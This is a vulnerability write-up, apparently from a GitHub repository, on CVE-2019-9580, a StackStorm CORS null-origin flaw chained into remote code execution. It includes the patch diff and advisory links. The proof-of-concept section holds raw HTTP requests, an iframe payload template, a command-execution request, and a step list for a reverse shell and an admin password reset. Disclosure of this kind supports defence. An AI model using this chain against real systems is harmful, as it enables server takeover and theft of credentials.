# CVE-2019-9580 - StackStorm exploiting CORS null origin to gain RCE < 2.9.3 and 2.10.3

> Prior to 2.10.3/2.9.3, if the origin of the request was unknown, we would return null.  null can result in a successful request from an unknown origin in some clients. Allowing the possibility of XSS style attacks against the StackStorm API.

found by [Barak Tawily](https://github.com/Quitten) and [Anna Tsibulskaya](https://github.com/anna-wix)

![Peek 13-03-2019 17-16](https://user-images.githubusercontent.com/5891788/54295917-39f07300-45b4-11e9-8387-63ed2b64878e.gif)
_(user on Firefox is the victim, user on Chrome is the attacker)_

### Proof of Concept


#### Exploiting null CORS
By sending a request to the StackStorm API with an null Origin header `Origin: null`, the server responds with an `Access-Control-Allow-Origin` to `null`.

```
GET /api/v1/executions?action=packs.get_config&limit=5&exclude_attributes=trigger_instance&parent=null HTTP/1.1
Host: localhost:4443
Origin: 443
Referer: https://localhost:4443/
x-auth-token: a19e39b9dff24e4798ba04c7036d0275
```

Server response:
```
Access-Control-Allow-Origin: null <-- hug hug hug
Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
Access-Control-Allow-Headers: Content-Type,Authorization,X-Auth-Token,St2-Api-Key,X-Request-ID
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Type,X-Limit,X-Total-Count,X-Request-ID
```

Exploiting null CORS is documented on a [blogpost from portswigger](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties) and we can found the following payload:
```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,
<script>

*inject your malicous code*

</script>’></iframe>
```

#### But what about the RCE ?

StackStorm allows you to configure **actions** and some of them like `core.remote` execute arbitrary command on the host of your choice.

![image](https://user-images.githubusercontent.com/5891788/54306352-7aa6b700-45c9-11e9-988c-726b150c9303.png)

So if we put host **127.0.0.1**, we will execute command on the StackStorm docker. Nice, RCE should be OK since a simple POST request is send to register an **action**.

```
POST /api/v1/executions HTTP/1.1
Host: localhost:4443
Origin: null
Content-Type: application/json
x-auth-token: a19e39b9dff24e4798ba04c7036d0275
Content-Length: 131

{"action":"core.remote","parameters":{"cmd":"touch /tmp/pwn2.txt","hosts":"127.0.0.1","cwd":"/tmp"},"context":{"trace_context":{}}}
```

#### What next ?

We can execute command on the host of StackStorm okay, but let's gain full control over StackStorm plateform. This can be down by reseting the password of the administrator. Using the documention:

> Need to change the password? Run: sudo htpasswd /etc/st2/htpasswd st2admin.
https://docs.stackstorm.com/authentication.html

Nice, let's just put all together :
1. Send a link to the victim with malicous payload that register a new **action** on the host 127.0.0.1 to exec an arbirary command
2. The victim clicks on the link and view the pony
3. Since CORS is null when a request is sent with header `Origin: null`, the POST request to register the new action is working (we also set the parameter `credentials: "include"`)
4. The action is trigger and command executed (reverse shell)
5. Attacker resets the password of the administrator and gain full control over StackStorm platform
6. Attacker can corrupt all the other host registered into StackStorm

![capture d'écran_1](https://user-images.githubusercontent.com/5891788/54295923-3d83fa00-45b4-11e9-82c5-faec2d5b2456.png)

**Security Advisory**: 
- https://stackstorm.com/2019/03/08/stackstorm-2-9-3-2-10-3/
- https://github.com/StackStorm/st2/pull/4577/commits/66605b7b202b8bd2db1ccd8c1ce7279028ac86d4

```diff
From 66605b7b202b8bd2db1ccd8c1ce7279028ac86d4 Mon Sep 17 00:00:00 2001
From: bigmstone <matthew99@gmail.com>
Date: Tue, 5 Mar 2019 12:22:26 -0600
Subject: [PATCH] Fix improper CORS return

Prior to this commit if you sent a request from an origin not listed in
`allowed_origins` we would respond with `null` for the
`Access-Control-Allow-Origin` header. Per
[https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin#Directives](mozilla's documentation)
null should not be used as some clients will allow the request to go
through. This commit returns the first of our allowed origins if the
requesting origin is not a supported origin.
---
 st2api/tests/unit/controllers/v1/test_base.py | 4 ++--
 st2common/st2common/middleware/cors.py        | 2 +-
 2 files changed, 3 insertions(+), 3 deletions(-)

diff --git a/st2api/tests/unit/controllers/v1/test_base.py b/st2api/tests/unit/controllers/v1/test_base.py
index 2a753f22ea..e66148a0a5 100644
--- a/st2api/tests/unit/controllers/v1/test_base.py
+++ b/st2api/tests/unit/controllers/v1/test_base.py
@@ -51,8 +51,8 @@ def test_wrong_origin(self):
             'origin': 'http://xss'
         })
         self.assertEqual(response.status_int, 200)
-        self.assertEqual(response.headers['Access-Control-Allow-Origin'],
-                         'null')
+        self.assertEqual(response.headers.get('Access-Control-Allow-Origin'),
+                        'http://127.0.0.1:3000')
 
     def test_wildcard_origin(self):
         try:
diff --git a/st2common/st2common/middleware/cors.py b/st2common/st2common/middleware/cors.py
index 5781b1a6e7..8cb407b52c 100644
--- a/st2common/st2common/middleware/cors.py
+++ b/st2common/st2common/middleware/cors.py
@@ -66,7 +66,7 @@ def custom_start_response(status, headers, exc_info=None):
                     origin_allowed = origin
                 else:
                     # See http://www.w3.org/TR/cors/#access-control-allow-origin-response-header
-                    origin_allowed = origin if origin in origins else 'null'
+                    origin_allowed = origin if origin in origins else list(origins)[0]
             else:
                 origin_allowed = list(origins)[0]
```

### Ressources:

* https://stackstorm.com/2019/03/08/stackstorm-2-9-3-2-10-3/
* https://quitten.github.io/StackStorm/

